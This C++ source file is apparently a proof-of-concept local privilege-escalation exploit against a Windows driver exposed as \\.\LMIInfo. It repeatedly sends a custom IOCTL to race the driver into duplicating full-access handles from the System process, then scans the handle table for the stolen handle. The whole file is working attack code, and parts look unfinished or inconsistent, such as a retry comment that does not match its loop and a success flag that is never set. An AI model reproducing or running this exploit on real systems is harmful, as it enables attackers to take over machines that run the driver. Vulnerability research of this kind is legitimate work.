#include <Windows.h>
#include <stdio.h>
#include <Psapi.h>
#include "LMI-Common.h"

int main() {
	LMI_INFO lmii = { 0 };
	lmii.qwPid = 4;
	DWORD dwHandleCount = 0;
	DWORD64 hBegin = 0;
	BOOL bFound = FALSE;
	BOOL bRes = FALSE;
	HANDLE hHeap = GetProcessHeap();
	DWORD dwBytesReturned = 0;
	LPVOID lpOutBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x1000);
	if (!lpOutBuf) {
		printf("HeapAlloc : %lx\n", GetLastError());
		return -1;
	}

	char* strFileName = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x300);
	if (!strFileName) {
		printf("HeapAlloc : %lx\n", GetLastError());
		return -1;
	}

	HANDLE hThreads[szNumThreads] = { 0 };
	HANDLE hSysProc = 0;

	printf("hCurProc = %p\n", g_hCurrentProc);
	
	

	HMODULE hNtdll = GetModuleHandleA("ntdll");
	if (!hNtdll) {
		printf("Could not get handle to ntdll");
		return -1;
	}
	
	puts("Opened device");

	std::vector<HANDLE> vHandles = QuerySystemHandlesForObjectTypeAndAccess(OBJECT_TYPE_PROCESS, 0x1fffff);
	printf("Got %zd handles\n", vHandles.size());
	const char* strDevName = R"(\\.\LMIInfo)";
	HANDLE hDevice = CreateFileA(
		strDevName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);


	if (!hDevice || hDevice == INVALID_HANDLE_VALUE) {
		printf("CreateFileA : %lx\n", GetLastError());
		return -1;
	}

	NTSTATUS status = NtQueryInformationProcess((HANDLE)-1, (PROCESSINFOCLASS)20, &dwHandleCount, sizeof(DWORD), &dwBytesReturned);
	if (status) {
		printf("NtQueryInfoProc failed with 0x%lx\n", status);
		return 0;
	}

	hBegin = ((DWORD64)dwHandleCount * 4) + 4;
	printf("Starting handle search at %llx\n", hBegin);

	getchar();

	for (HANDLE x : vHandles) {
		printf("Testing handle %p\n", x);
		if (bFound) {
			break;
		}

	
		lmii.handleValue = (DWORD64)x;

		// try a duping handle a maximum of 10 times
		for (size_t i = 0; i < 100; i++)
		{
			if (i % 10 == 0) {
				printf(".");
			}
			// call DeviceIoControl to start the race
			bRes = DeviceIoControl(
				hDevice,
				IOCTL_DUPE_LEL,
				&lmii,
				sizeof(LMI_INFO),
				lpOutBuf,
				0x1000,
				&dwBytesReturned,
				NULL
			);

			HANDLE hDupedHandle = HandleSearchThread(hBegin, 0x1fffff);
			if (hDupedHandle) {
				DWORD dwStrLen = GetProcessImageFileNameA(hDupedHandle, strFileName, 0x300);

				if (!dwStrLen) {
					printf("Failed to get string file name for process handle - %p\n", hDupedHandle);
				}

				printf("Got string %s\n", strFileName);

				if (dwStrLen != g_strLenTargetProc) {
					memset(strFileName, 0, dwStrLen);
					break;
				}

				
			}
		}
	}
	getchar();
	


	return 0;
}